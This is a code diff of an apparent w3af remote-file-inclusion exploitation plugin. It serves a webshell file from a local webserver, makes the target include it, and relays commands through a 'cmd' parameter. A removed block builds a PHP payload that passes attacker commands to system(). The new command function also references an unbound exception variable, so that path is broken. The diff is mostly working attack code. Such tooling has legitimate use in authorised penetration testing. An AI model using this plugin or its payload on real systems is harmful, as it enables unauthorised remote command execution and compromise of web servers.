@@ -47,7 +47,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
     def __init__(self):
         baseAttackPlugin.__init__(self)
         self._shell = None
-        self._wS = None
+        self._webServer = None
         
         # User configured variables
         self._listenPort = w3afPorts.REMOTEFILEINCLUDE
@@ -116,6 +116,8 @@ class remoteFileIncludeShell(baseAttackPlugin):
             s = rfiShell( vuln )
             s.setUrlOpener( self._urlOpener )
             s.setCut( self._header, self._footer )
+            s.setWebServer( self._webServer )
+            s.setExploitDc( self._exploitDc )
             return s
         else:
             return None
@@ -144,19 +146,21 @@ class remoteFileIncludeShell(baseAttackPlugin):
             # Prepare for exploitation...
             functionReference = getattr( self._urlOpener , vuln.getMethod() )
             dc = vuln.getDc()
-            dc[ variable ] = urlToInclude
+            dc[ vuln.getVar() ] = urlToInclude
 
             try:
-                httpRes = functionReference( url, str(exploitQs) )
+                httpRes = functionReference( vuln.getURL(), str(dc) )
             except:
-                response = False
+                successfullyExploited = False
             else:
-                response = self._defineCut( httpRes.getBody(), rand , exact=True )
+                successfullyExploited = self._defineCut( httpRes.getBody(), 'w3af' , exact=True )
             
-            self._clearWebServer( urlToInclude )
-            
-            if response:
-                return response
+            if successfullyExploited:
+                self._exploitDc = dc
+                return successfullyExploited
+            else:
+                # Remove the file from the local webserver webroot
+                self._clearWebServer( urlToInclude )
                 
         return False
     
@@ -184,60 +188,24 @@ class remoteFileIncludeShell(baseAttackPlugin):
             else:
                 urlToInclude = 'http://' + self._listenAddress +':' + str(self._listenPort) +'/' + filename
                 return urlToInclude
-
-    
-    def _rexec( self, command ):
-        '''
-        This method is called when a command is being sent to the remote server.
-        This is a NON-interactive shell.
-
-        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
-        @return: The result of the command.
-        '''
-        # Escape the quotes
-        command = command.replace('"','\\"')
-        
-        # Lets send the command.
-        # Create a file that will be included ( PHP only )
-        filename = createRandAlNum()
-        phpStr = '<? \n system("'
-        phpStr += command + '");\n'
-        phpStr += ' ?>'
-        
-        urlToInclude = self._genURLToInclude( phpStr, '' )
-        
-        self._startWebServer()
-
-        result=''
-        functionReference = getattr( self._urlOpener , self._method )
-        self._exploitQs[ self._variable ] = urlToInclude
-        try:
-            response = functionReference( self._url, str(self._exploitQs) )
-        except:
-            return 'Error including file in remote host. Try again.'
-        else:
-            result = ''
-            try:
-                result = self._cut( response.getBody() )    
-            except w3afException, w:
-                result = str(w)
-            else:
-                self._clearWebServer( urlToInclude )
-                
-        return result
     
     def _clearWebServer( self, urlToInclude ):
-        if not self._useXssBug and self._wS:
-            self._wS.stop()
+        '''
+        Remove the file in the webroot and stop the webserver.
+        '''
+        if not self._useXssBug and self._webServer:
+            self._webServer.stop()
             # Remove the file
             filename = urlToInclude.split('/')[-1:][0]
             os.remove( os.path.join('webroot' + os.path.sep, filename ) )
-            self._wS = None 
+            self._webServer = None 
     
     def _startWebServer( self ):
-        if not self._useXssBug and not self._wS:
-            self._wS = webserver( self._listenAddress, self._listenPort , 'webroot' + os.path.sep)
-            self._wS.start2()
+        if self._useXssBug:
+            return
+        if not self._webServer:
+            self._webServer = webserver( self._listenAddress, self._listenPort , 'webroot' + os.path.sep)
+            self._webServer.start2()
             time.sleep(0.2) # wait for webserver thread to start
             
     def getOptionsXML(self):
@@ -329,15 +297,19 @@ class remoteFileIncludeShell(baseAttackPlugin):
             - listenAddress
             - listenPort
             - useXssBug
+            - generateOnlyOne
         '''
         
 class rfiShell(shell):
-    def setExploitURL( self, eu ):
-        self._exploit = eu
+    def setExploitDc( self, eDc ):
+        self._exploitDc = eDc
     
-    def getExploitURL( self ):
-        return self._exploit
-        
+    def getExploitDc( self ):
+        return self._exploitDc
+    
+    def setWebServer( self, webserverInstance ):
+        self._webServer = webserverInstance
+    
     def _rexec( self, command ):
         '''
         This method is called when a command is being sent to the remote server.
@@ -346,19 +318,38 @@ class rfiShell(shell):
         @parameter command: The command to send ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        toSend = self.getExploitURL() + urllib.quote_plus( command )
-        response = self._urlOpener.GET( toSend )
-        return response.getBody()
+        eDc = self.getExploitDc()
+        eDc = eDc.copy()
+        eDc[ 'cmd' ] = urllib.quote_plus( command )
+        
+        functionReference = getattr( self._urlOpener , self.getMethod() )
+        try:
+            httpRes = functionReference( self.getURL(), str(eDc) )
+        except:
+            return 'Unexpected response from the remote web application:' + str(e)
+        else:
+            return self._cut( httpRes.getBody() )
         
     def end( self ):
-        om.out.debug('File upload shell is going to delete the webshell that was uploaded before.')
-        fileToDel = urlParser.getFileName( self.getExploitURL() )
+        om.out.debug('Remote file inclusion shell is cleaning up.')
         try:
-            self.removeFile(fileToDel)
+            self._clearWebServer( self.getExploitDc()[ self.getVar() ] )
         except Exception, e:
-            om.out.error('File upload shell cleanup failed with exception: ' + str(e) )
+            om.out.error('Remote file inclusion shell cleanup failed with exception: ' + str(e) )
         else:
-            om.out.debug('File upload shell cleanup complete.')
+            om.out.debug('Remote file inclusion shell cleanup complete.')
     
     def getName( self ):
         return 'rfiShell'
+
+    def _clearWebServer( self, urlToInclude ):
+        '''
+        TODO: This is duplicated code!! see above.
+        '''
+        if self._webServer:
+            self._webServer.stop()
+            # Remove the file
+            filename = urlToInclude.split('/')[-1:][0]
+            os.remove( os.path.join('webroot' + os.path.sep, filename ) )
+            self._webServer = None
+            
